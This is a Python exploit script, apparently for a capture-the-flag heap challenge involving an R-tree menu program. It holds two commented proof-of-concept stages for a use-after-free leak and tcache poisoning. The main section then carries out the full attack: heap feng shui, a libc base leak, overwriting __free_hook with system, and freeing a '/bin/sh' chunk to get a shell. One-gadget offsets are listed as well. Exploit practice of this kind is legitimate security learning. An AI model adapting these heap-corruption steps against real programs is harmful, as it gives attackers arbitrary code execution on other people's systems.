#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"Your choice > ")
    sl(i2b(choice))


def add(x0, y0, name):
    cmd(0)
    ru(b"new element x-coordinate value: ")
    sl(i2b(x0))
    ru(b"new element y-coordinate value: ")
    sl(i2b(y0))
    ru(b"new element name: ")
    s(name.ljust(32, b"\x00"))


def delet(x0, y0):
    cmd(1)
    ru(b"want element x-coordinate value: ")
    sl(i2b(x0))
    ru(b"want element y-coordinate value: ")
    sl(i2b(y0))


def edit(x0, y0, name):
    cmd(2)
    ru(b"want element x-coordinate value: ")
    sl(i2b(x0))
    ru(b"want element y-coordinate value: ")
    sl(i2b(y0))
    ru(b"input the edited name: ")
    s(name.ljust(32, b"\x00"))


def show(x0, y0):
    cmd(3)
    ru(b"want element x-coordinate value: ")
    sl(i2b(x0))
    ru(b"want element y-coordinate value: ")
    sl(i2b(y0))


"""
POC 1

prove there is a very direct UAF,
this POC leak heap tcache address

# STEP1: fill the tree into specific format
add(0, 0, b"A" * 16)
add(0, 1, b"B" * 16)
add(2, 0, b"C" * 16)
add(2, 1, b"D" * 16)
add(0, 2, b"E" * 16)
add(2, 2, b"F" * 16)

# input("[DEBUG]")
## The R-Tree is like below
##       ()
##      /  \
## (A,B,E) (C,D,F) 

# STEP2: send a malicious node
# close to both child
# cause two reference here
add(1, 1, b"G" * 16)

# STEP3: Free this one
delet(1, 1)

# STEP4: UAF read to leak tcache header
show(1, 1)

# after this how we exploit?
# learn

ia()
"""

"""
POC 2

we try to spray a fake heap on existing heap
through tcache posion


# STEP1: fill the tree into specific format
add(0, 0, b"A" * 16)
add(0, 1, b"B" * 16)
add(2, 0, b"C" * 16)
add(2, 1, b"D" * 16)
add(0, 2, b"E" * 16)
add(2, 2, b"F" * 16)

# input("[DEBUG]")
## The R-Tree is like below
##       ()
##      /  \
## (A,B,E) (C,D,F) 

# STEP2: send a malicious node
# close to both child
# cause two reference here

input("[ENTER]")

add(1, 1, b"G" * 16)
add(1, 2, b"H" * 16)

# construct tcache posion chain
delet(1, 1)
delet(1, 2)

show(1, 2)
ru("found!!! its name: ", drop=True)
leak_heap = rn(16)
heap_chunk_addr = u64_ex(leak_heap[:8])
heap_tcache_addr = u64_ex(leak_heap[8:])

print("[*] leak tcache header address:", hex(heap_tcache_addr))

# poison fd to somewhere else
# here 0xdeadbeaf
edit(1, 2, p64(0xdeadbeaf) + p64(heap_tcache_addr))

# create two node will conduct SIGSEGV
add(0, 3, b"I" * 16)

add(0, 4, b"J" * 16)

ia()
"""

"""
EXP: take the abitary chunk to where we know 
     in the heap and do fengshui
"""

# STEP-1: make sure there are enough nodes
for i in range(32):
    add(0, i * 2, b"A" * 32)

# STEP-2: prepare tcache used nodes
#         and the UAF one

add(0, 55, b"B" * 32)  # 55 is between 54 and 56
# add suppose into two leafs
# (56, ... 62) 4 elements in the most right now
delet(0, 62)
delet(0, 55)

show(0, 55)
ru("found!!! its name: ", drop=True)
leak_heap = rn(32)
heap_chunk_addr = u64_ex(leak_heap[:8])
heap_tcache_addr = u64_ex(leak_heap[8:16])
print("[*] leak tcache header address:", hex(heap_tcache_addr))

# spray at node (0,0)
spray_address = heap_tcache_addr + 0x2C0 + 0x10
print("[*] fake chunk at", hex(spray_address))

edit(0, 55, p64(spray_address) + p64(heap_tcache_addr) + b"\x00" * 16)

edit(0, 0, p64(0) + p64(0x420 + 1) + p64(0) + p64(heap_tcache_addr))

edit(0, 0x18, p64(0) + p64(0x20 + 1) + p64(0) + p64(0))
# 0x420 size will make its end just reside in
# 0 0x18

# do two allocation to spray this fake chunk
add(0, 62, b"C" * 32)
add(0, 64, b"D" * 32)

# free this huge fake chunk into unsorted bin
delet(0, 64)

# we can leak the address from overlapping one
show(0, 0)
ru("found!!! its name: ", drop=True)
leak_unsortedbin = rn(32)
unsorted_head_addr = u64_ex(leak_unsortedbin[0x10:0x18])

print("leak unsorted bin head:", hex(unsorted_head_addr))

unsorted_bin_offset = 0x3EBCA0
libc_start = unsorted_head_addr - unsorted_bin_offset

print("hence leak libc base:", hex(libc_start))

__free_hook_addr = libc_start + libc.symbols["__free_hook"]
print("hence leak __free_hook addr:", hex(__free_hook_addr))

# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
# onegadget_addr = libc_start + 0x10a2fc

system_addr = libc_start + libc.symbols["system"]
print("hence leak system addr:", hex(system_addr))


# since we have get libc, we know the where the __free_hook is
# simply adopt the tcache posion again to spray a tcache chunk to it

add(0, 0x13, b"\x00" * 32)  # 19 is between 18 and 20

delet(0, 0x10)
delet(0, 0x13)

edit(0, 0x13, p64(__free_hook_addr) + p64(heap_tcache_addr) + b"\x00" * 16)

# do two allocation to spray this fake chunk

payload = b"/bin/sh\x00"
payload += (32 - len(payload)) * b"\x00"
add(0, 0x15, payload)
add(0, 0x19, p64(system_addr) + b"\x00" * 24)

# free hook should be written
delet(0, 0x15)

ia()
